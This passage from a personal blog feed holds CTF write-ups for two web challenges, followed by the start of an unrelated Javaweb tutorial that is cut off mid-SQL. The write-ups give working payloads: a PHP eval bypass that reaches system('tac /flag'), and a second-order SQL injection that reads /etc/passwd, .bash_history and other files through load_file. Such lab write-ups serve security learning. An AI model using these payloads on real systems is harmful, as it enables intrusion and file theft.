    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];
    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);
        &#125;
    &#125;
    <span class="hljs-comment">//帮你算出答案</span>
    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);
&#125;</code></pre>



<p>get提交参数c，c的长度不能超过80</p>
<p>不能包括blacklist中的字符</p>
<p>不能有不是$whitelist白名单里面的单词出现</p>
<p>并且函数只能以下面的格式出现</p>
<blockquote>
<p>abs(1)能过<br>1abs()能过<br>absa()不能过<br>abs(a)不能过<br>abs()a不能过</p>
</blockquote>
<p>代码的最后出现了 eval 这是我们想看到的，因为它出现的时候，就可能存在命令执行漏洞</p>
<p>这题实在是无能为力，看了王师傅的wp</p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">详情看这里</a></p>
<h3 id="0x2构造payload-1"><a href="#0x2构造payload-1" class="headerlink" title="0x2构造payload"></a>0x2构造payload</h3><p>//这题需要使用到php复杂变量，具体可以看<a href="https://xz.aliyun.com/t/4785">这里</a></p>
<p>当这个题目没有给出那么限制的时候我们想要构造的payload一定是</p>
<pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>)</code></pre>

<p>但是由于限制，必须想办法绕过这些限制，比如多提交一个参数，构造出上面的payload</p>
<p>比如</p>
<pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[b])(<span class="hljs-symbol">$</span>_GET[a])&amp;b=<span class="hljs-keyword">system</span>&amp;a=cat /flag <span class="hljs-comment">//这里是b,a多提交的参数，不会被检测 这里的[]可以使用&#123;&#125;代替</span></code></pre>

<p>下面的具体工作就是如何利用上面提供的函数构造出 <code>_GET</code>，并且能够绕过检测。</p>
<p>首先看一下函数的白名单里给了哪些可以用的函数<strong>base_convert()，dechex</strong></p>
<p>还有一些短的函数名pi,cos,sin,tan等，因为限制了长度，所以要尽量使用短的函数名代替a和b</p>
<p><img src="https://i.loli.net/2020/12/05/GnP1emRYpJDd2Q6.png" alt="base_convert"></p>
<p><img src="https://i.loli.net/2020/12/05/TsrCzK3hAl4ufEm.png" alt="dechex"></p>
<p>开始的想法就是将利用base_canvert()，转化出一个_GET，但是发现base_convert()不支持_，并且转换出的字符是小写的</p>
<p><img src="https://i.loli.net/2020/12/05/9G4zKrO2HMoc1vN.png" alt="image-20201205215546962"></p>
<p>所以这里用到了一个中间过渡的函数hex2bin()，与之功能想反的函数是bin2hex()</p>
<p><img src="https://i.loli.net/2020/12/05/JeivVF1qO8YyRmK.png" alt="image-20201205220057762"></p>
<p>实现方法如下</p>
<p><img src="https://i.loli.net/2020/12/05/FVMbzCNOwkIsnWd.png" alt="image-20201205215938937"></p>
<p>下面就是将_GET转换为十六进制数字</p>
<pre><code class="hljs gams"><span class="hljs-comment">//bin2hex(&quot;_GET&quot;)-&gt;5f474554</span>
?c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-number">5</span>f474554);(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-number">1</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-number">2</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-number">2</span>=tac /flag</code></pre>

<p>想法是好的，但是这里不能直接提交，因为不符合上面的几种函数使用的格式</p>
<p>所以就要想办法使用一个函数把<code>5f474554</code>提交上去</p>
<p>这里用的是dechex，就是将十进制数转换为十六进制数，再交给hex2bin出来</p>
<p>所以这里有个逆过程就是将<code>5f474554</code>转换为十进制</p>
<pre><code class="hljs apache"><span class="hljs-attribute">intval</span>(&#x27;<span class="hljs-number">5</span>f<span class="hljs-number">474554</span>&#x27;,<span class="hljs-number">16</span>);</code></pre>

<p>所以具体的payload如下</p>
<pre><code class="hljs awk">?c=<span class="hljs-variable">$pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));($<span class="hljs-variable">$pi</span>)&#123;<span class="hljs-number">1</span>&#125;(($<span class="hljs-variable">$pi</span>)&#123;<span class="hljs-number">2</span>&#125;)&amp;<span class="hljs-number">1</span>=system&amp;<span class="hljs-number">2</span>=tac /flag

<span class="hljs-regexp">//</span>base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)=&gt;hex2bin
<span class="hljs-regexp">//</span>dechex(<span class="hljs-number">1598506324</span>)=&gt;<span class="hljs-number">5</span>f474554
<span class="hljs-regexp">//</span>hex2bin(<span class="hljs-string">&#x27;5f474554&#x27;</span>)=&gt;_GET
<span class="hljs-regexp">//</span><span class="hljs-variable">$pi</span>=_GET
<span class="hljs-regexp">//</span>(<span class="hljs-variable">$_GET</span>)&#123;<span class="hljs-number">1</span>&#125;(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-number">2</span>&#125;)</code></pre>

<p>7分的题目果然不一样，看wp都写了好久</p>
<p>既然没有能力自己做出来，那就好好研究一下别人做题的思路，以便以后遇到类似题目能够有思路。</p>
<h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><h3 id="0x1扫描目录"><a href="#0x1扫描目录" class="headerlink" title="0x1扫描目录"></a>0x1扫描目录</h3><p>拿到题目扫 一下目录，发现是出现.git，那应该就是git源码泄露，可是githacker下载下来的文件好像不全，看了看大佬的wp</p>
<p>暂时没搞懂是怎么下载的，日后再看细看</p>
<p>源码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;
session_start();
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;
    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);
    <span class="hljs-keyword">die</span>();
&#125;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;
<span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])
&#123;
<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:
    <span class="hljs-variable">$category</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);
    <span class="hljs-variable">$title</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);
    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);
    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span>
<span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span>
<span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span>
<span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;
    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);
    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);
    <span class="hljs-keyword">break</span>;
<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:
    <span class="hljs-variable">$bo_id</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);
    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;
    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);
    <span class="hljs-variable">$num</span> = mysql_num_rows(<span class="hljs-variable">$result</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$category</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];
    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);
    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span>
<span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span>
<span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span>
<span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;
    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);
    &#125;
    header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);
    <span class="hljs-keyword">break</span>;
<span class="hljs-keyword">default</span>:
    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);
&#125;
&#125;
<span class="hljs-keyword">else</span>&#123;
    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>可以看到在write部分提交的都是经过转义后带入查询语句查询的，但是下面的comment中category没有经过任何过滤就带入了sql语句进行查询，这就可能存在二次注入。</p>
<h3 id="0x2二次注入"><a href="#0x2二次注入" class="headerlink" title="0x2二次注入"></a>0x2二次注入</h3><p>进入题目可以提交评论，但是要登录，给了提示</p>
<pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>zhangwei
<span class="hljs-symbol">password:</span>zhangwei***</code></pre>

<p>使用bp爆破出的密码是zhangwei666</p>
<p><img src="https://i.loli.net/2020/12/07/8Xx35WQfTARLcnz.png" alt="image-20201207093624672"></p>
<p>登录后先进入发帖的界面,构造payload</p>
<pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment
            set category &#x3D; &#39;$category&#39;,
                content &#x3D; &#39;$content&#39;,
                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre>

<p>之前sql注入方法中经常使用的注释方法都是当行注释，但是这个题目的查询使用的是多行，所以这里注释也需要使用多行注释  /**/ </p>
<p>在这里注入的sql语句，在comment页面会被sql重新调出来，从而执行了注入语句，这也是为啥叫做二次注入</p>
<p>于是构造的sql语句如下</p>
<pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment
            set category &#x3D; &#39;&#39;,content&#x3D;user(),&#x2F;*&#39;,
                content &#x3D; &#39;*&#x2F;#&#39;,
                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre>

<p>因为中间的 cntent被包围在多行注释中间，所以这里不起作用等价于</p>
<pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment
            set category &#x3D; &#39;&#39;,content&#x3D;user(),
                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre>

<p>当在评论页面评论<code>*/#</code>时，会与之前的<code>/*</code>的进行闭合，就够造出了我们想要的sql语句，user()这个sql函数就会被执行，显示当前的用户</p>
<p><img src="https://i.loli.net/2020/12/07/DEre87viLhH6Aby.png" alt="image-20201207094017109"></p>
<p> 原理知道了，下面就是具体的做这个题目</p>
<p>首先读取 <strong>/etc/passwd</strong> 看看服务器上有哪些用户，payload为: <strong>‘,content=(select load_file(‘/etc/passwd’)),/*</strong></p>
<p><img src="https://i.loli.net/2020/12/07/rg5k8mAsKST3hea.png" alt="image-20201207094741282"></p>
<p>可以看到是有www用户的，那么久存在<strong>.bash_history</strong> 记录，继续查看</p>
<pre><code class="hljs awk">title=<span class="hljs-number">1</span>&amp;category=<span class="hljs-string">&#x27;,content=(select( load_file(&#x27;</span><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/.bash_history&#x27;))),/</span>*&amp;content=<span class="hljs-number">11</span></code></pre>





<p><img src="https://i.loli.net/2020/12/07/7YDFXWbGHcxNqAk.png" alt="image-20201207094934593"></p>
<p>也就是以下几条指令</p>
<pre><code class="hljs awk">cd  <span class="hljs-regexp">/tmp/</span> 
unzip html.zip
rm -f html.zip
cp -r html <span class="hljs-regexp">/var/</span>www/
cd  <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>
rm -f .DS_Store
service apache2 start</code></pre>

<p>可以看出来 <code>.Ds_Store</code>是存在/tmp/html目录下的，那就看看有什么</p>
<p>直接查看该文件会发现长度不够，而且显示不可见字符</p>
<p><img src="https://i.loli.net/2020/12/07/Bl5n6KNOTUdGb1Z.png" alt="image-20201207095822022"></p>
<p>使用hex()就可以解决这个问题</p>
<pre><code class="hljs awk">title=<span class="hljs-number">1</span>&amp;category=<span class="hljs-string">&#x27;,content=(select hex( load_file(&#x27;</span><span class="hljs-regexp">/tmp/</span>html<span class="hljs-regexp">/.DS_Store&#x27;))),/</span>*&amp;content=<span class="hljs-number">11</span></code></pre>

<p>在线解码后可以看到以下内容，存在一个 <code>flag_8946e1ff1ee3e40f.php</code></p>
<p><img src="/2020/11/30/adworld/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201207100157447.png" alt="image-20201207100157447"></p>
<p>查看flag，但是要注意的是，这个文件是从 /var/www/html/中复制过来的，所以还是要到那个目录读取</p>
<pre><code class="hljs apache"><span class="hljs-attribute">title</span>=<span class="hljs-number">1</span>&amp;category=&#x27;,content=(select hex( load_file(&#x27;/var/www/html/flag_<span class="hljs-number">8946</span>e<span class="hljs-number">1</span>ff<span class="hljs-number">1</span>ee<span class="hljs-number">3</span>e<span class="hljs-number">40</span>f.php&#x27;))),/*&amp;content=<span class="hljs-number">11</span></code></pre>



<p><img src="https://i.loli.net/2020/12/07/Ce9WJYTFU5HMrOp.png" alt="image-20201207101235024"></p>
<p>在线解码即可</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>javaweb</title>
    <url>/2022/03/30/javaweb/</url>
    <content><![CDATA[<h1 id="Javaweb基础项目"><a href="#Javaweb基础项目" class="headerlink" title="Javaweb基础项目"></a>Javaweb基础项目</h1><p>学完 javaweb 做的小项目</p>
<h2 id="综合案例需求与准备"><a href="#综合案例需求与准备" class="headerlink" title="综合案例需求与准备"></a>综合案例需求与准备</h2><p><strong>今日目标：</strong></p>
<blockquote>
<ul>
<li>能够完成查询所有功能</li>
<li>能够完成添加功能</li>
<li>能够理解 BaseServlet 思想</li>
<li>能够完成批量删除功能</li>
<li>能够完成分页查询功能</li>
<li>能够完成条件查询功能</li>
</ul>
</blockquote>
<h3 id="1，功能介绍"><a href="#1，功能介绍" class="headerlink" title="1，功能介绍"></a>1，功能介绍</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825171411003.png" alt="image-20210825171411003"></p>
<p>以上是我们在综合案例要实现的功能。对数据的除了对数据的增删改查功能外，还有一些复杂的功能，如 <code>批量删除</code>、<code>分页查询</code>、<code>条件查询</code> 等功能</p>
<ul>
<li><code>批量删除</code> 功能：每条数据前都有复选框，当我选中多条数据并点击 <code>批量删除</code> 按钮后，会发送请求到后端并删除数据库中指定的多条数据。</li>
<li><code>分页查询</code> 功能：当数据库中有很多数据时，我们不可能将所有的数据展示在一页里，这个时候就需要分页展示数据。</li>
<li><code>条件查询</code> 功能：数据库量大的时候，我们就需要精确的查询一些想看到的数据，这个时候就需要通过条件查询。</li>
</ul>
<p>这里的 <code>修改品牌</code> 和 <code>删除品牌</code> 功能在课程上不做讲解，留作同学来下的练习。</p>
<h3 id="2，环境准备"><a href="#2，环境准备" class="headerlink" title="2，环境准备"></a>2，环境准备</h3><p>环境准备我们主要完成以下两件事即可</p>
<ul>
<li>将资料的 brand-case 模块导入到 idea中</li>
<li>执行资料中提供的 tb_brand.sql脚本</li>
</ul>
<p>在没有资料的情况下在idea中创建<code>maven</code>的web项目可以使用下面的方法</p>
<p><code>file</code> -&gt; <code>new</code> -&gt; <code>module</code>-&gt;<code>Maven</code>-&gt;<code>Create from archetype</code>-&gt;<code>maven archetype</code>-&gt;<code>next</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330133227350.png" alt="image-20220330133227350"></p>
<h4 id="2-1-工程准备"><a href="#2-1-工程准备" class="headerlink" title="2.1  工程准备"></a>2.1  工程准备</h4><p>将 <code>04-资料\01-初始工程</code> 中的 <code>brand-case</code> 工程导入到我们自己的 idea 中。工程结构如下：</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825195522904.png" alt="image-20210825195522904" style="zoom:80%;">

<h4 id="2-2-创建表"><a href="#2-2-创建表" class="headerlink" title="2.2  创建表"></a>2.2  创建表</h4><p>下面是创建表的语句</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 删除tb_brand表</span>
<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> tb_brand;
<span class="hljs-comment">-- 创建tb_brand表</span>
<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> tb_brand (
    <span class="hljs-comment">-- id 主键</span>
    id           <span class="hljs-type">int</span> <span class="hljs-keyword">primary</span> key auto_increment,
    <span class="hljs-comment">-- 品牌名称</span>
    brand_name   <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>),
    <span class="hljs-comment">-- 企业名称</span>
    company_name <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>),
    <span class="hljs-comment">-- 排序字段</span>
    ordered      <span class="hljs-type">int</span>,
    <span class="hljs-comment">-- 描述信息</span>
    description  <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>),
    <span class="hljs-comment">-- 状态：0：禁用  1：启用</span>
    status       <span class="hljs-type">int</span>
);
<span class="hljs-comment">-- 添加数据</span>
<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> tb_brand (brand_name, company_name, ordered, description, status)
<span class="hljs-keyword">values</span> 
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;三只松鼠&#x27;</span>, <span class="hljs-string">&#x27;三只松鼠股份有限公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;好吃不上火&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;三只松鼠&#x27;</span>, <span class="hljs-string">&#x27;三只松鼠股份有限公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;好吃不上火&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
